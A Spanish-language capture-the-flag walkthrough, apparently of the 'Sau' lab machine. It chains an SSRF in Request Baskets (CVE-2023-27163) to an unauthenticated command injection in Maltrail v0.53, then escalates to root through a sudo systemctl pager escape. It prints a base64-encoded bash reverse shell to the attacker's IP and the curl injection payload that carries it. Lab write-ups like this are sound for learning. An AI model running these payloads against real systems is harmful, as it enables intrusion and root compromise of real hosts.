PORT      STATE SERVICE
22/tcp    open  ssh
55555/tcp open  unknown

-En el puerto 55555 hay un Software llamado **'Requests Baskets'**.

-Buscamos y Tiene una Vulnerabilidad SSRF:
	**CVE-2023-27163**

-Nos Descargamos el siguiente Exploit y Probamos:
	https://github.com/J0ey17/Exploit_CVE-2023-27163

-Lo Ejecutamos:
	-python3 PoC_27163.py
		Something is on http://127.0.0.1:80

-Nos Ha descubierto que el Puerto 80 está Abierto, con un Servicio Corriendo llamado **'maltrail'**

-En la web nos vamos a 'Settings', ponemos los siguientes valores para comprobar que hay un 'maltrail' en el puerto 80:
	-Forward URL: http://127.0.0.1:80
	-Insecure TLS: False
	-Proxy Response: True
	-Expand Forward Path: True

-NOTA IMPORTANTE: Estos Ajustes hacen que las Peticiones que mandemos a 'http://10.10.11.224:55555/Test', se redirijan a 'http://localhost:80/', que es dónde está el **'Maltrail' Vulnerable**.

-Después , hacemos una Petición a nuestro Basket y a ver que vemos:
	-curl -s -X GET http://10.10.11.224:55555/Test
		-Vemos lo mismo que con el Exploit de **'CVE-2023-27163'**, en el **Output de Curl** nos sale que **hay un 'Maltrail'**.

-Encontramos el siguiente Exploit:
	**Maltrail v0.53 - Unauthenticated OS Command Injection (RCE)**

## Maltrail Exploitation

### Manual

1-Generamos una RS en Base64:
	-echo 'bash -c bash -i >& /dev/tcp/10.10.14.18/443 0>&1' | base64
		YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE4LzQ0MyAwPiYxCg==

2-Hacemos una Petición a nuestra Basket, que a su vez derivará la Petición a http://localhost:80/ gracias al SSRF, allí es dónde se encuentra el Panel de Login Vulnerable de 'Maltrail' en el cual estamos explotando el **Command Injection**:
	-curl 'http://10.10.11.224:55555/Test/login' --data 'username=; `echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE4LzQ0MyAwPiYxCg==|base64 -d|bash`'
		**puma@sau:/opt/maltrail$ whoami**
			**puma**

### Automática

-Este segundo Exploit, nos Entabla una RS, como URL le ponemos la del Basket, que con los Settings que tenemos, va a redirigir la Petición a http://localhost:80/ que es dónde está el Maltrail y va a Explotat el Command Injection, Entablándonos una RS a nuestro equipo:
	-python3 exploit.py 10.10.14.18 1234 http://10.10.11.224:55555/Test
		**puma@sau:/opt/maltrail$ whoami**
			**puma**

## Escalada de Privilegios

-sudo -l:
	**(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service**

-Ejecutamos el Binario con sudo y escribimos '!bash' para Spawnear una Shell como root:
	-sudo /usr/bin/systemctl status trail.service
		!bash
			**root@sau:/home/puma# whoami**
				**root**




